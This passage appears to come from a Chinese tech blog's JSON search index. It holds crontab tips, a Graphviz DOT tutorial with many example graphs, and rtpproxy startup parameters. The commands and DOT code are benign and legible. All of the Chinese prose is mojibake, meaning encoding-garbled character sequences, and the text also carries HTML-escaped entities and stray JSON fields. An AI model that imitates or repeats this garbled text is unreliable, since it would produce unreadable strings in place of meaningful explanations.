ç„¶ååœ¨è„šæœ¬é‡Œè®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡å°±èƒ½æå®š\n#!/bin/bash PATH=\u0026#39;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#39; now=`date` msg=`opensips -V` echo \u0026#34;$now $PATH $msg \\n\\n\u0026#34; \u0026gt;\u0026gt; /root/test.log ä¹Ÿå¯ä»¥ä½¿ç”¨ journalctl -t CROND æŸ¥çœ‹ crond çš„æ—¥å¿—\næ£€æŸ¥ crontab æ˜¯å¦è¿è¡Œ systemctl status crond systemctl restart crond åœ¨ alpine ä¸­æ‰§è¡Œ crontab alpine ä¸­æ²¡æœ‰ systemctlï¼Œ éœ€è¦å¯åŠ¨ crond çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå¦åˆ™ç¨‹åºå®šæ—¶ä»»åŠ¡æ˜¯ä¸ä¼šæ‰§è¡Œçš„\n#!/bin/sh # start cron /usr/sbin/crond -f -l 8 ","permalink":"https://wdd.js.org/shell/crontab-tips/","summary":"æˆ‘å·²ç»åœ¨ crontab ä¸Šæ ½äº†å¾ˆå¤šæ¬¡è·Ÿå¤´äº†ï¼Œæˆ‘å†³å®šå†™ä¸ªæ€»ç»“ã€‚\nå¸¸ç”¨çš„å‘½ä»¤ crontab -l # æ˜¾ç¤ºè®¡åˆ’ä»»åŠ¡è„šæœ¬ crontab -e # ç¼–è¾‘è®¡åˆ’ä»»åŠ¡ è®¡åˆ’ä»»åŠ¡çš„æ ¼å¼ æ—¶é—´æ ¼å¼ * # æ¯ä¸ªæœ€å°å•å…ƒ / # æ—¶é—´æ­¥é•¿ï¼Œæ¯éš”å¤šé•¿æ—¶é—´æ‰§è¡Œ */10 - # åŒºé—´ï¼Œå¦‚ 4-9 , # æ•£åˆ—ï¼Œå¦‚ 4,9,10 å‡ ä¸ªä¾‹å­ crontab æœ€å°æ”¯æŒçš„æ—¶é—´å•ä½æ˜¯ 1 åˆ†é’Ÿï¼Œä¸æ”¯æŒæ¯ä¸ªå¤šå°‘ç§’æ‰§è¡Œä¸€æ¬¡\n# æ¯åˆ†é’Ÿæ‰§è¡Œ * * * * * cmd # æ¯å°æ—¶çš„15ï¼Œ45åˆ†é’Ÿæ‰§è¡Œ 15,45 * * * * cmd # æ¯ä¸ªå‘¨ä¸€åˆ°å‘¨äº”ï¼Œæ—©ä¸Š9ç‚¹åˆ°ä¸‹åˆ6ç‚¹ä¹‹é—´ï¼Œæ¯éš”15åˆ†é’Ÿå–ä¸€æ¬¡æ°´ */15 9,18 * * 1-5 å–æ°´ æ¯ä¸ª X ç§’æ‰§è¡Œ crontab çš„é»˜è®¤æœ€å°æ‰§è¡Œå‘¨æœŸæ˜¯ 1 åˆ†é’Ÿï¼Œå¦‚æœæƒ³æ¯éš”å¤šå°‘ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå°±éœ€è¦ä¸€äº›ç‰¹æ®Šçš„æ‰‹æ®µã€‚\næ¯éš” 5 ç§’ * * * * * for i in {1.","title":"é•¿å¤ªæ¯ä»¥æ©æ¶•å…®ï¼Œå“€crontabä¹‹éš¾ç”¨"},{"content":"è¯­é›€å®˜æ–¹çš„Graphvizæ„Ÿè§‰å¤ªå¤æ‚ï¼Œæˆ‘è¿˜æ˜¯å†™ä¸€ä¸ªç®€å•ä¸€ç‚¹çš„å§ã€‚\nä¸¤ä¸ªåœ†ä¸€æ¡çº¿ æ³¨æ„\ngraphæ˜¯ç”¨æ¥æ ‡è®°æ— å‘å›¾ï¼Œé‡Œé¢åªèƒ½ç”¨\u0026ndash;ï¼Œä¸èƒ½ç”¨-\u0026gt;ï¼Œå¦åˆ™æ— æ³•æ˜¾ç„¶å‡ºå›¾ç‰‡ digraphç”¨æ¥æ ‡è®°æœ‰å‘å›¾ï¼Œé‡Œé¢åªç”¨ç”¨-\u0026gt; ä¸èƒ½ç”¨\u0026ndash;, å¦åˆ™æ— æ³•æ˜¾ç„¶å‡ºå›¾ç‰‡ graph easy { a -- b; } è¿çº¿åŠ ä¸ªå¤‡æ³¨ graph easy{ a--b [label=\u0026#34;ä½ çœŸæ¼‚äº®\u0026#34;] } ä½ çœŸæ¼‚äº®ï¼Œè¦å¤§ç‚¹ï¼Œçº¢è‰²æ˜¾çœ¼ç‚¹ graph easy{ a--b [label=\u0026#34;ä½ çœŸæ¼‚äº®\u0026#34;, fontcolor=red, fontsize=34] } ä¸¤ä¸ªåœ†ï¼Œä¸€ä¸ªå¸¦æœ‰ç®­å¤´çš„çº¿ æ³¨æ„ï¼Œè¿™é‡Œç”¨çš„digraphï¼Œ ç”¨æ¥è¡¨ç¤ºæœ‰å‘å›¾\ndigraph easy { a -\u0026gt; b; } å¦‚ä½•ç”»è™šçº¿å‘¢ï¼Ÿ digraph easy { a -\u0026gt; b [style=dashed]; } æ¤­åœ†å¤ªå•è°ƒäº†ï¼Œæœ‰æ²¡æœ‰å…¶ä»–å½¢çŠ¶ï¼Ÿ shape\nboxÂ çŸ©å½¢ polygon ellipse circleÂ åœ†å½¢ point egg è›‹å½¢ triangle ä¸‰è§’å½¢ plaintext ä½¿ç”¨æ–‡å­— diamond é’»çŸ³å‹ trapezium æ¢¯å½¢ parallelogram æ–œçš„é•¿æ–¹å½¢ house hexagon octagon doublecircle doubleoctagon tripleoctagon invtriangle invtrapezium invhouse Mdiamond Msquare Mcircle none record Mrecord graph easy { node [shape=box] a -- b; } å½¢çŠ¶ä¹Ÿå¯ä»¥ç›´æ¥ç»™èŠ‚ç‚¹å®šä¹‰ã€‚\ngraph easy{ a [shape=parallelogram] b [shape=egg] a--b; } è¿˜æœ‰ä»€ä¹ˆå¸ƒå±€å§¿åŠ¿ï¼Ÿ é»˜è®¤å›¾æ˜¯ä»ä¸Šåˆ°ä¸‹ç”»çš„ï¼Œä½ å¯ä»¥ç”¨rankdir = LRæ¥è®©å›¾ä»å·¦å¾€å³ç»˜åˆ¶\ndigraph easy { rankdir = LR; a -\u0026gt; b; } å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–å§¿åŠ¿\nrankdir\nLRÂ ä»å·¦å¾€å³å¸ƒå±€ RL ä»å³å¾€å·¦å¸ƒå±€ TBÂ ä»ä¸Šä¸‹å¾€ä¸‹å¸ƒå±€ï¼ˆé»˜è®¤ï¼‰ BT ä»ä¸‹å¾€ä¸Šå¸ƒå±€ å¤šæ¥å‡ ä¸ªåœ†ï¼Œçœ‹çœ‹æ•ˆæœ digraph easy { rankdir = LR; a -\u0026gt; b; b -\u0026gt; c; a -\u0026gt; c; c -\u0026gt; d; a -\u0026gt; d; } æ€ä¹ˆåŠ æ³¨é‡Šï¼Ÿ æ”¯æŒä¸¤ç§æ³¨é‡Š\n// /**/ digraph easy { a -\u0026gt; b; // ä»aåˆ°b b -\u0026gt; c; /* ä»båˆ°c */ } å¥å°¾è¦ä¸è¦åŠ åˆ†å·ï¼Ÿ ç­”ï¼šåˆ†å·ä¸æ˜¯å¿…é¡»çš„ï¼Œä½ éšæ„\nå¦‚ä½•èµ·ä¸ªåˆ«åï¼Ÿ ä¸èµ·åˆ«åçš„æ—¶å€™ï¼Œåå­—å¤ªé•¿ï¼Œå¼•ç”¨ä¸æ–¹ä¾¿ã€‚\ngraph easy{ \u0026#34;ç›´åˆ°ç¡®å®šï¼Œæ‰‹çš„æ¸©åº¦æ¥è‡ªä½ å¿ƒé‡Œ\u0026#34;--\u0026#34;è¿™ä¸€åˆ»ï¼Œä¹Ÿç»ˆäºå‹‡æ•¢è¯´çˆ±ä½ \u0026#34;; \u0026#34;è¿™ä¸€åˆ»ï¼Œä¹Ÿç»ˆäºå‹‡æ•¢è¯´çˆ±ä½ \u0026#34; -- \u0026#34;ä¸€å¼€å§‹ æˆ‘åªé¡¾ç€çœ‹ä½ , è£…åšä¸ç»æ„ å¿ƒå´é£˜è¿‡å»\u0026#34; } èµ·ä¸ªåˆ«åï¼Œå¿«é€Ÿå¼•ç”¨\ngraph easy{ a [label=\u0026#34;ç›´åˆ°ç¡®å®šï¼Œæ‰‹çš„æ¸©åº¦æ¥è‡ªä½ å¿ƒé‡Œ\u0026#34;]; b [label=\u0026#34;è¿™ä¸€åˆ»ï¼Œä¹Ÿç»ˆäºå‹‡æ•¢è¯´çˆ±ä½ \u0026#34;]; c [label=\u0026#34;ä¸€å¼€å§‹ æˆ‘åªé¡¾ç€çœ‹ä½ , è£…åšä¸ç»æ„ å¿ƒå´é£˜è¿‡å»\u0026#34;] a -- b; b -- c; } ç»Ÿä¸€è®¾ç½®ç‚¹çº¿çš„æ ·å¼ digraph easy{ rankdir = LR; node [color=Red,shape=egg] edge [color=Pink, style=dashed] a -\u0026gt; b; b -\u0026gt; c; a -\u0026gt; c; c -\u0026gt; d; a -\u0026gt; d; } åŠ ç‚¹é¢œè‰² digraph easy{ bgcolor=Pink; b [style=filled, fillcolor=yellow, center=true] a-\u0026gt;b; } ç¦ç”¨å…³é”®è¯ ä¸‹é¢çš„å…³é”®è¯ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œä¸èƒ½ä½œä¸ºèŠ‚ç‚¹çš„åå­—ï¼Œå¦‚æœä½ ç”¨äº†ï¼Œä½ çš„å›¾å°±ç”»ä¸å‡ºæ¥\nnode,Â edge,Â graph,Â digraph,Â subgraph, andÂ strict\nä¸‹é¢çš„å†™æ³•ä¼šå¯¼è‡´ç»˜å›¾å¤±è´¥\ngraph a { node -- edge } ä½†æ˜¯å…³é”®è¯å¯ä»¥ä½œä¸ºLabel\ngraph a { a [label=\u0026#34;node\u0026#34;] b [label=\u0026#34;edge\u0026#34;] a -\u0026gt; b } å¿«æ·æ–¹å¼ - ä¸²èµ·æ¥ # æ–¹å¼1 ä¸¤ç‚¹ä¹‹é—´ä¸€ä¸ªä¸€ä¸ªè¿æ¥ digraph { a -\u0026gt; b; b -\u0026gt; c; c -\u0026gt; d; } # æ–¹å¼2 ç›´æ¥ä¸²èµ·æ¥æ‰€æœ‰çš„ç‚¹ digraph { a -\u0026gt; b -\u0026gt; c -\u0026gt; d; } # æ–¹å¼3 ç›´æ¥ä¸²èµ·æ¥æ‰€æœ‰çš„ç‚¹, ä¹Ÿå¯æ¢è¡Œ digraph { a-\u0026gt;b -\u0026gt;c -\u0026gt;d -\u0026gt;e; } å¯¹æ¯”å‘ç°ï¼Œç›´æ¥ä¸²èµ·æ¥çš„è¯ï¼Œæ›´ç®€å•ï¼Œé€Ÿåº¦æ›´å¿«ã€‚å¯¹äºæ— å‘å›¾ ä¹Ÿå¯ä»¥ç”¨ a -- b -- c -- dÂ çš„æ–¹å¼ä¸²èµ·æ¥ã€‚\nå¿«æ·æ–¹å¼ - å¤§æ‹¬å· å¯¹äºä¸Šé¢çš„å›¾ï¼Œä¹Ÿæœ‰ä¸¤ç§ç»˜åˆ¶æ–¹æ³•ã€‚ç”¨å¤§æ‹¬å·çš„æ–¹å¼æ˜æ˜¾æ›´å¥½å‘€ï¼ ğŸ˜º\n# æ–¹å¼1 digraph { a -\u0026gt; b; a -\u0026gt; c; a -\u0026gt; d; b -\u0026gt; z; c -\u0026gt; z; d -\u0026gt; z; } # æ–¹å¼2 digraph { a -\u0026gt; {b;c;d} {b;c;d} -\u0026gt; z } æ•°æ®ç»“æ„ UML æ€ä¹ˆç”»å‘€ï¼Ÿ æ¯”å¦‚è¯´ä¸‹é¢çš„typescriptæ•°æ®ç»“æ„\ninterface Man { name: string; age: number; isAdmin: boolean } interface Phone { id: number; type: string; } æ³¨æ„ï¼šnode [shape=\u0026ldquo;record\u0026rdquo;]\ndigraph { node [shape=\u0026#34;record\u0026#34;] man[label=\u0026#34;{Man|name:string|age:number|isAdmin:boolean}\u0026#34;] phone[label=\u0026#34;{Phone|id:number|type:string}\u0026#34;] } æ•°æ®ç»“æ„ä¹‹é—´çš„å…³ç³»å¦‚ä½•è¡¨ç¤ºï¼Ÿ é”šç‚¹ ä¾‹å¦‚Manç±»å‹æœ‰ä¸ªå­—æ®µphone, æ˜¯Phoneç±»å‹çš„\ninterface Man { name: string; age: number; isAdmin: booleanï¼› phone: Phone } interface Phone { id: number; type: string; } interface Plain { key1:aaa; key2:bbb; } æ³¨æ„lableé‡Œé¢çš„å†…å®¹ï¼Œå…¶ä¸­\u0026lt;\u0026gt;è¿™ä¸ªç¬¦å·å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé”šç‚¹ã€‚\nman:age-\u0026gt;plain:key1Â è¿™ä¸ªæ„æ€æ˜¯mançš„ageé”šç‚¹è¿æ¥åˆ°plainçš„key1é”šç‚¹ã€‚\ndigraph { node [shape=\u0026#34;record\u0026#34;] man[label=\u0026#34;{Man|name:string|\u0026lt;age\u0026gt;age:number|isAdmin:booleanï½œ\u0026lt;phone\u0026gt;phone:Phone}\u0026#34;] phone[label=\u0026#34;{Phone|id:number|\u0026lt;type\u0026gt;type:string}\u0026#34;] plain[label=\u0026#34;{Plain|\u0026lt;key1\u0026gt;key1:aaa|key2:bbb}\u0026#34;] man:phone-\u0026gt;phone man:age-\u0026gt;plain:key1 [color=\u0026#34;red\u0026#34;] phone:type-\u0026gt;plain:key1 } hash é“¾è¡¨ digraph { rankdir=LR; node [shape=\u0026#34;record\u0026#34;,height=.1, width=.1]; node0 [label = \u0026#34;\u0026lt;f0\u0026gt;a |\u0026lt;f1\u0026gt;b |\u0026lt;f2\u0026gt;c|\u0026#34;, height=2.5]; node1 [label = \u0026#34;{\u0026lt;n\u0026gt; a1 | a2 | a3 | a4 |\u0026lt;p\u0026gt; }\u0026#34;]; node2 [label = \u0026#34;{\u0026lt;n\u0026gt; b1 | b2 |\u0026lt;p\u0026gt; }\u0026#34;]; node3 [label = \u0026#34;{\u0026lt;n\u0026gt; c1 | c2 |\u0026lt;p\u0026gt; }\u0026#34;]; node0:f0-\u0026gt;node1:n [headlabel=\u0026#34;a link\u0026#34;] node0:f1-\u0026gt;node2:n [headlabel=\u0026#34;b link\u0026#34;] node0:f2-\u0026gt;node3:n [headlabel=\u0026#34;c link\u0026#34;] } label {}çš„ä½œç”¨ digraph { node [shape=\u0026#34;record\u0026#34;]; node0 [label = \u0026#34;0|a|b|c|d|e\u0026#34;,height=2.5]; node1 [label = \u0026#34;{1|a|b|c|d|e}\u0026#34;,height=2.5]; } å¯¹äºrecordè€Œè¨€\næœ‰{} , åˆ™å±æ€§ä½œç”¨äºæ•´ä½“ æ— {}, åˆ™å±æ€§ä½œç”¨äºä¸ªä½“ åˆ†ç»„å­å›¾ subgraph å…³é”®è¯æ ‡è®°åˆ†ç»„ ç»„åå¿…éœ€ä»¥clusterå¼€å¤´ graph { rankdir=LR node [shape=\u0026#34;box\u0026#34;] subgraph cluster_1 { label=\u0026#34;network1\u0026#34;; bgcolor=\u0026#34;mintcream\u0026#34;; host_11 [label=\u0026#34;router\u0026#34;]; host_12; host_13; } subgraph cluster_2 { label=\u0026#34;network2\u0026#34;; bgcolor=\u0026#34;mintcream\u0026#34;; host_21 [label=\u0026#34;router\u0026#34;]; host_22; host_23; } host_12--host_11; host_13--host_11; host_11--host_21; host_22--host_21; host_23--host_21; } æµç¨‹å›¾ äºŒç­‰è½¦å¢åº§ä½ç¤ºæ„å›¾ digraph{ label=\u0026#34;äºŒç­‰è½¦å¢åº§ä½ç¤ºæ„å›¾\u0026#34; node [shape=record]; struct3 [ shape=record, label=\u0026#34;è½¦çª—|{ {01A|01B|01C}| {02A|02B|02C}| {03A|03B|03C} } |è¿‡é“|{ {01D|01F}| {02D|02F}| {03D|03F} }|è½¦çª—\u0026#34; ]; } Node Port å¯ä»¥ä½¿ç”¨nodePortæ¥è°ƒæ•´ç›®æ ‡çš„è¿æ¥ç‚¹, node Portå¯ä»¥ç†è§£ä¸ºåœ°å›¾ä¸Šçš„ä¸œå—è¥¿åŒ—ã€‚\nn | w\u0026lt;----+----\u0026gt; e | s digraph { rankdir=LR node [shape=box] a-\u0026gt;b:n [label=n] a-\u0026gt;b:ne [label=ne] a-\u0026gt;b:e [label=e] a-\u0026gt;b:se [label=se] a-\u0026gt;b:s [label=s] a-\u0026gt;b:sw [label=sw] a-\u0026gt;b:w [label=w] a-\u0026gt;b:nw [label=nw] } ç”µç£æ„Ÿåº”çº¿åœˆ \u0026lt;\u0026gt;å¯ä»¥ç”¨æ¥è‡ªå®šä¹‰é”šç‚¹ï¼Œé”šç‚¹å¯ä»¥ç”¨æ¥è¿çº¿ã€‚\ndigraph{ node [shape=record]; edge[style=dashed] t [style=filled;fillcolor=gray;label=\u0026#34;\u0026lt;l\u0026gt;N| ï½œï½œï½œï½œï½œï½œ|\u0026lt;r\u0026gt;S\u0026#34;] t:l-\u0026gt;t:r [color=red] t:l-\u0026gt;t:r[color=red] t:l-\u0026gt;t:r[color=red] t:l-\u0026gt;t:r[color=red] t:l-\u0026gt;t:r[color=red] t:r:s-\u0026gt;t:l:s[color=green] t:r:s-\u0026gt;t:l:s[color=green] t:r:s-\u0026gt;t:l:s[color=green] t:r:s-\u0026gt;t:l:s[color=green] t:r:s-\u0026gt;t:l:s[color=green] } ä¸‰ä½“çº ç¼  digraph{ nodesep=.8 ranksep=1 rankdir=TD node[shape=circle] edge [style=dashed] a[style=filled;fillcolor=red;label=\u0026#34;\u0026#34;;color=red] b[style=filled;fillcolor=red2;label=\u0026#34;\u0026#34;;color=red2] c[style=filled;fillcolor=red4;label=\u0026#34;\u0026#34;;color=red4] a-\u0026gt;b[color=red] a-\u0026gt;c[color=green] a-\u0026gt;b[color=red] a-\u0026gt;c[color=green] a-\u0026gt;b[color=red] a-\u0026gt;c[color=green] b-\u0026gt;c[color=orange] b-\u0026gt;a[color=red] b-\u0026gt;c[color=orange] b-\u0026gt;a[color=red] b-\u0026gt;c[color=orange] b-\u0026gt;a[color=red] c-\u0026gt;a[color=green] c-\u0026gt;b[color=orange] c-\u0026gt;a[color=green] c-\u0026gt;b[color=orange] c-\u0026gt;a[color=green] c-\u0026gt;b[color=orange] } äºŒå‰æ ‘ digraph { node [shape = record,height=.1]; t0 [label=\u0026#34;\u0026lt;l\u0026gt;|9|\u0026lt;r\u0026gt;\u0026#34;] t1 [label=\u0026#34;\u0026lt;l\u0026gt;|1|\u0026lt;r\u0026gt;\u0026#34;] t5 [label=\u0026#34;\u0026lt;l\u0026gt;|5|\u0026lt;r\u0026gt;\u0026#34;] t6 [label=\u0026#34;\u0026lt;l\u0026gt;|6|\u0026lt;r\u0026gt;\u0026#34;] t11 [label=\u0026#34;\u0026lt;l\u0026gt;|11|\u0026lt;r\u0026gt;\u0026#34;] t34 [label=\u0026#34;\u0026lt;l\u0026gt;|34|\u0026lt;r\u0026gt;\u0026#34;] t0:l-\u0026gt;t5 t0:r-\u0026gt;t11 t5:l-\u0026gt;t1 t5:r-\u0026gt;t6 t11:r-\u0026gt;t34 } æ°´å¹³åˆ†å±‚ ç›¸å…³çš„èŠ‚ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨rankå±æ€§ï¼Œä½¿å…¶åˆ†å¸ƒåœ¨ç›¸åŒçš„æ°´å¹³å±‚æ¬¡ã€‚\ndigraph{ nodesep=.3 ranksep=.8 node [shape=none] åº”ç”¨å±‚ -\u0026gt; è¿è¾“å±‚ -\u0026gt; ç½‘ç»œå±‚ -\u0026gt; é“¾è·¯å±‚; node [shape=box]; http;websocket;sip;ssh; tcp;udp; icmp;ip;igmp; arp;rarp; {rank=same;åº”ç”¨å±‚;http;websocket;sip;ssh} {rank=same;è¿è¾“å±‚;tcp;udp} {rank=same;ç½‘ç»œå±‚;icmp;ip;igmp} {rank=same;é“¾è·¯å±‚;arp;ç¡¬ä»¶æ¥å£;rarp} http-\u0026gt;tcp websocket-\u0026gt;tcp; sip-\u0026gt;tcp; sip-\u0026gt;udp; ssh-\u0026gt;tcp; tcp-\u0026gt;ip; udp-\u0026gt;ip; ip-\u0026gt;igmp; icmp-\u0026gt;ip; ip-\u0026gt;ç¡¬ä»¶æ¥å£; arp-\u0026gt;ç¡¬ä»¶æ¥å£; ç¡¬ä»¶æ¥å£-\u0026gt;rarp; } æœ€åæŒ‘æˆ˜ï¼Œç”»ä¸ªå°äºº digraph easy{ nodesep = 0.5 header [shape=circle, label=\u0026#34;^_^\u0026#34;, style=filled, fillcolor=pink] body [shape=invhouse, label=\u0026#34;~ ~\\n~ ~\\n~ ~\u0026#34;, center=true, style=filled, fillcolor=peru] leftHand [shape=Mcircle, label=\u0026#34;\u0026#34;, style=filled, fillcolor=palegoldenrod] rightHand [shape=Mcircle, label=\u0026#34;\u0026#34;, style=filled, fillcolor=palegoldenrod] leftFoot [shape=egg, label=\u0026#34;\u0026#34;, style=filled, fillcolor=palegoldenrod] rightFoot [shape=egg, label=\u0026#34;\u0026#34;, style=filled, fillcolor=palegoldenrod] header-\u0026gt;body [arrowhead=crow]; body-\u0026gt;leftHand [arrowhead=invodot, penwidth=3, color=cornflowerblue, tailport=ne]; body-\u0026gt; rightHand [arrowhead=invodot, penwidth=3, color=cornflowerblue, tailport=nw]; body -\u0026gt; leftFoot [arrowhead=tee, penwidth=5, color=cornflowerblue] body -\u0026gt; rightFoot [arrowhead=tee, penwidth=5, color=cornflowerblue] } è¿˜æœ‰é‚£äº›é¢œè‰²å¯ä»¥ä½¿ç”¨å‘¢ï¼Ÿ é¢œè‰²é¢„è§ˆï¼šhttp://www.graphviz.org/doc/info/colors.html\nè¿˜æœ‰é‚£äº›ç®­å¤´çš„æ ·å¼å¯ä»¥ç”¨å‘¢ï¼Ÿ æˆ‘çš„å›¾æ²¡é¢„è§ˆå‡ºæ¥ï¼Œæ€ä¹ˆåŠï¼Ÿ ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœå›¾æ²¡æœ‰æ¸²æŸ“å‡ºæ¥ï¼Œéƒ½æ˜¯å› ä¸ºç»˜å›¾è¯­æ³•å‡ºé—®é¢˜äº†ã€‚\næˆ‘åˆšåˆšå¼€å§‹ç”¨çš„æ—¶å€™ï¼Œå°±å¸¸å¸¸æŠŠ\u0026ndash;ç”¨åœ¨æœ‰å‘å›¾ä¸­ï¼Œå¯¼è‡´å›¾æ— æ³•é¢„è§ˆã€‚å»ºè®®å®˜æ–¹å¯ä»¥æŠŠæŠ¥é”™ä¿¡æ¯æç¤ºç»™ç”¨æˆ·ã€‚\nç›®å‰æ¥è¯´ï¼Œè¿™ä¸ªé”™è¯¯ä¿¡æ¯åªåœ¨æ§åˆ¶å°ä¸­æ‰“å°äº†ï¼Œéœ€è¦æŒ‰F12æ‰“å¼€æµè§ˆå™¨çš„consoleç•Œé¢ã€‚çœ‹çœ‹å“ªé‡Œå‡ºé”™äº†ï¼Œç„¶åæ‰¾åˆ°å¯¹åº”çš„ä½ç½®ä¿®æ”¹ã€‚\nå‚è€ƒ https://graphviz.gitlab.io/_pages/pdf/dotguide.pdf https://casatwy.com/shi-yong-dotyu-yan-he-graphvizhui-tu-fan-yi.html é™„ä»¶ dotguide.pdf\n","permalink":"https://wdd.js.org/posts/2019/06/","summary":"è¯­é›€å®˜æ–¹çš„Graphvizæ„Ÿè§‰å¤ªå¤æ‚ï¼Œæˆ‘è¿˜æ˜¯å†™ä¸€ä¸ªç®€å•ä¸€ç‚¹çš„å§ã€‚\nä¸¤ä¸ªåœ†ä¸€æ¡çº¿ æ³¨æ„\ngraphæ˜¯ç”¨æ¥æ ‡è®°æ— å‘å›¾ï¼Œé‡Œé¢åªèƒ½ç”¨\u0026ndash;ï¼Œä¸èƒ½ç”¨-\u0026gt;ï¼Œå¦åˆ™æ— æ³•æ˜¾ç„¶å‡ºå›¾ç‰‡ digraphç”¨æ¥æ ‡è®°æœ‰å‘å›¾ï¼Œé‡Œé¢åªç”¨ç”¨-\u0026gt; ä¸èƒ½ç”¨\u0026ndash;, å¦åˆ™æ— æ³•æ˜¾ç„¶å‡ºå›¾ç‰‡ graph easy { a -- b; } è¿çº¿åŠ ä¸ªå¤‡æ³¨ graph easy{ a--b [label=\u0026#34;ä½ çœŸæ¼‚äº®\u0026#34;] } ä½ çœŸæ¼‚äº®ï¼Œè¦å¤§ç‚¹ï¼Œçº¢è‰²æ˜¾çœ¼ç‚¹ graph easy{ a--b [label=\u0026#34;ä½ çœŸæ¼‚äº®\u0026#34;, fontcolor=red, fontsize=34] } ä¸¤ä¸ªåœ†ï¼Œä¸€ä¸ªå¸¦æœ‰ç®­å¤´çš„çº¿ æ³¨æ„ï¼Œè¿™é‡Œç”¨çš„digraphï¼Œ ç”¨æ¥è¡¨ç¤ºæœ‰å‘å›¾\ndigraph easy { a -\u0026gt; b; } å¦‚ä½•ç”»è™šçº¿å‘¢ï¼Ÿ digraph easy { a -\u0026gt; b [style=dashed]; } æ¤­åœ†å¤ªå•è°ƒäº†ï¼Œæœ‰æ²¡æœ‰å…¶ä»–å½¢çŠ¶ï¼Ÿ shape\nboxÂ çŸ©å½¢ polygon ellipse circleÂ åœ†å½¢ point egg è›‹å½¢ triangle ä¸‰è§’å½¢ plaintext ä½¿ç”¨æ–‡å­— diamond é’»çŸ³å‹ trapezium æ¢¯å½¢ parallelogram æ–œçš„é•¿æ–¹å½¢ house hexagon octagon doublecircle doubleoctagon tripleoctagon invtriangle invtrapezium invhouse Mdiamond Msquare Mcircle none record Mrecord graph easy { node [shape=box] a -- b; } å½¢çŠ¶ä¹Ÿå¯ä»¥ç›´æ¥ç»™èŠ‚ç‚¹å®šä¹‰ã€‚","title":"Graphvizæ•™ç¨‹ ä½ å­¦åºŸäº†å—ï¼Ÿ"},{"content":"rtppoxyèƒ½æä¾›ä»€ä¹ˆåŠŸèƒ½ï¼Ÿ VoIP NATç©¿é€ ä¼ è¾“å£°éŸ³ã€è§†é¢‘ç­‰ä»»ä½•RTPæµ æ’­æ”¾é¢„å…ˆè®¾ç½®çš„å‘¼å…¥æ”¾éŸ³ RTPåŒ…é‡æ–°åˆ†ç‰‡ åŒ…ä¼ è¾“ä¼˜åŒ– VoIP VPN ç©¿é€ å®æ—¶æµå¤åˆ¶ rtpproxyä¸€èˆ¬å’Œé‚£äº›è½¯ä»¶é›†æˆï¼Ÿ opensips Kamailio Sippy B2BUA freeswitch reSIProcate B2BUA rtpporxyçš„å·¥ä½œåŸç† å¯åŠ¨å‚æ•°ä»‹ç» å‚æ•° åŠŸèƒ½è¯´æ˜ ä¾‹å­ -l ipv4ç›‘å¬çš„åœ°å€ -l 192.168.3.47 -6 ipv6ç›‘å¬çš„åœ°å€ -s æ§åˆ¶Socket, é€šè¿‡è¿™ä¸ªsocketæ¥ä¿®æ”¹ï¼Œåˆ›å»ºæˆ–è€…åˆ é™¤rtp session -s udp:192.168.3.49:6890 -F é»˜è®¤æƒ…å†µä¸‹ï¼Œrtpproxyä¼šè­¦å‘Šç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½è¿è¡Œrtpproxyå¹¶ä¸”ä¸å…è®¸è¿œç¨‹æ§åˆ¶ã€‚ä½¿ç”¨-Få¯ä»¥å…³é—­è¿™ä¸ªé™åˆ¶ -m æœ€å°ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤35000 -m 20000 -M æœ€å¤§ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤65000 -M 50000 -L å•ä¸ªè¿›ç¨‹æœ€å¤šå¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ã€‚rtpproxyè¦æ±‚æ¯ä¸ªsessionä½¿ç”¨4ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ -L 20000 -d æ—¥å¿—çº§åˆ«ï¼Œå¯é€‰DBUG, INFO, WARN, ERR and CRIT, é»˜è®¤DBUG -d ERR -A å¹¿æ’­åœ°å€ï¼Œç”¨äºrtpprxyåœ¨NATé˜²ç«å¢™å†…éƒ¨æ—¶ä½¿ç”¨ -A 171.16.200.13 -f è®©rtpproxyå‰å°è¿è¡Œï¼Œåœ¨åšrtpproxyå®¹å™¨åŒ–æ—¶ï¼Œå¯åŠ¨è„šæœ¬å¿…é¡»å¸¦æœ‰-fï¼Œå¦åˆ™å®¹å™¨è¿è¡Œåä¼šç«‹å³é€€å‡º -V è¾“å‡ºrtpproxyçš„ç‰ˆæœ¬ å‚è€ƒ https://www.rtpproxy.org/ https://www.rtpproxy.org/doc/master/user_manual.html https://github.com/sippy/rtpproxy ","permalink":"https://wdd.js.org/opensips/ch9/rtpproxy/","summary":"rtppoxyèƒ½æä¾›ä»€ä¹ˆåŠŸèƒ½ï¼Ÿ VoIP NATç©¿é€ ä¼ è¾“å£°éŸ³ã€è§†é¢‘ç­‰ä»»ä½•RTPæµ æ’­æ”¾é¢„å…ˆè®¾ç½®çš„å‘¼å…¥æ”¾éŸ³ RTPåŒ…é‡æ–°åˆ†ç‰‡ åŒ…ä¼ è¾“ä¼˜åŒ– VoIP VPN ç©¿é€ å®æ—¶æµå¤åˆ¶ rtpproxyä¸€èˆ¬å’Œé‚£äº›è½¯ä»¶é›†æˆï¼Ÿ opensips Kamailio Sippy B2BUA freeswitch reSIProcate B2BUA rtpporxyçš„å·¥ä½œåŸç† å¯åŠ¨å‚æ•°ä»‹ç» å‚æ•° åŠŸèƒ½è¯´æ˜ ä¾‹å­ -l ipv4ç›‘å¬çš„åœ°å€ -l 192.168.3.47 -6 ipv6ç›‘å¬çš„åœ°å€ -s æ§åˆ¶Socket, é€šè¿‡è¿™ä¸ªsocketæ¥ä¿®æ”¹ï¼Œåˆ›å»ºæˆ–è€…åˆ é™¤rtp session -s udp:192.168.3.49:6890 -F 